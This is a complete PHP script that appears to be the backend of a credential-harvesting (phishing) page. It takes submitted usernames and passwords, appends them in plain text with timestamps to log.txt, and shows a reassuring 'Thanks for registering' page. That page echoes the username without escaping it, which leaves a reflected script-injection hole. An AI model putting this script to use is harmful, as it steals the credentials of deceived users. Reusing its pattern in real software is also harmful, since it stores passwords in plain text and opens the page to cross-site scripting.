<?php
ini_set('display_errors', 1); 
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture the username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Open the file in append mode
    $file = fopen("log.txt", "a");

    // Check if the file was opened successfully
    if (!$file) {
        echo "Error opening file.";
        exit;
    }

    // Write the username and password to the file
    $log_entry = "Username: $username, Password: $password, Timestamp: " . date("Y-m-d H:i:s") . "\n";
    fwrite($file, $log_entry);

    // Close the file
    fclose($file);

    // Display a success message
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>Login Success</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 50px;
            }
            h1 {
                color: red;
            }
            p {
                color: #6c757d;
            }
        </style>
    </head>
    <body>
        <h1>Thanks for registering.</h1>
        <p>Welcome, $username!</p>
    </body>
    </html>";
} else {
    echo "<h1>Invalid request method.</h1>";
}
?>
